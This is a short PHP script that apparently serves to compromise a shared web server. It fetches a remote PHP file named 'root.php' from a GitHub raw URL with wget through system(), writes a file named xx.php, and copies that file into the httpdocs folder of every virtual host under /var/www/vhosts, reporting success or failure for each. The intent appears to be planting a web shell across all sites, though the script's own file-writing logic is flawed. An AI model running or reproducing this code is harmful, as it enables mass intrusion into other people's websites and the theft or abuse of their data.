<?php
error_reporting(0);

$root = '/var/www/vhosts';
$scan = scandir($root);

$nama = 'xx.php'; 
$isi = system("wget https://raw.githubusercontent.com/Sniperxxx/sniper404/main/root.php -O about.php");

$bikin = fopen($nama, "w");
		 fwrite($bikin, $isi);
		 fclose($bikin);

foreach ( $scan as $a ) {
	$dir = "$a \n";
	$gas = $root.'/'.$a.'/httpdocs/'.$nama;
	$cos = "$gas \n";
	$asu = @copy($nama, $gas);
	if($asu) {
		print 'Done! => '.$cos; }
			else { print 'Failed! => '.$dir; }
	}
?>
